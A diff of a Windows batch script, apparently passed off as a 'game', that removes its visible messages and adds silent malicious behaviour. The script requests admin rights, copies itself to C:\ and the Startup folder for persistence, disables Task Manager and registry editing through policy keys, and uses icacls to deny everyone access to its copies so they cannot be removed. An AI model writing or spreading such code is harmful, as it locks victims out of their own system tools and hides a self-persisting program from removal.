@@ -1,10 +1,5 @@
 @echo off
 cls
-echo.
-echo This script will:
-echo 1. Basically do nothing.
-echo 2. and thats it
-echo.
 
 :: Check for admin rights
 net session >nul 2>&1
@@ -20,31 +15,27 @@ exit /b
 
 :SkipUAC
 
-:: Set variables
+:: Variables
 set "source=%~f0"
 set "filename=%~nx0"
-set "dest=C:\%filename%"
 
 :: Copy to C:\
-copy /y "%source%" "%dest%"
-if errorlevel 1 (
-    echo error game couldnt upload onto c drive.
-) else (
-    echo Game successfully copied to C:\
-)
+copy /y "%source%" "C:\%filename%" >nul
 
-:: Copy to Startup Folder
-set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%"
-echo.
-copy /y "%source%" "%startup%"
-if errorlevel 1 (
-    echo uh ohs
-) else (
-    echo hehe
-)
+:: Copy to Startup
+copy /y "%source%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" >nul
+
+:: Disable Task Manager
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
+
+:: Optional: Remove permissions on the Registry key to prevent easy removal
+icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" /deny Everyone:F >nul 2>&1
+icacls "C:\%filename%" /deny Everyone:F >nul 2>&1
+
+:: Make registry key inaccessible
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /v "NoRegistryTools" /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul
 
 echo.
-echo rah
-echo - lorem
-echo - ok
-pause
+pause >nul
+exit
